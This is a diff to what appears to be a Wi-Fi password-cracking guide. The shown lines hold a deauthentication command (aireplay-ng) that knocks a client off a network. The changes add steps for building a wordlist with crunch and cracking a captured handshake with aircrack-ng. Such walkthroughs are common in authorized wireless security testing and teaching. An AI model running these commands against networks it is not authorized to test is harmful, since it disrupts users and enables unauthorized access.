@@ -207,16 +207,13 @@ aireplay-ng --deauth 4 -a [NetworkMAC] -c [TargetMAC] wlan0
 ```
 Step 3: Generate wordlist.
 ```
-crunch [min] [max] [characters] -t [pattern] -o [outputfilename]
+crunch [min] [max] [characters] -t [pattern] -o [wordlistfilename]
 ```
-
-
-
-
-
-
-
-
+Example: `crunch 6 8 123abc -t a@@@@b -o test.txt`
+Step 4: Crack with the wordlist.
+```
+aircrack-ng filename.cap -w [wordlistfilename]
+```
 
 
 
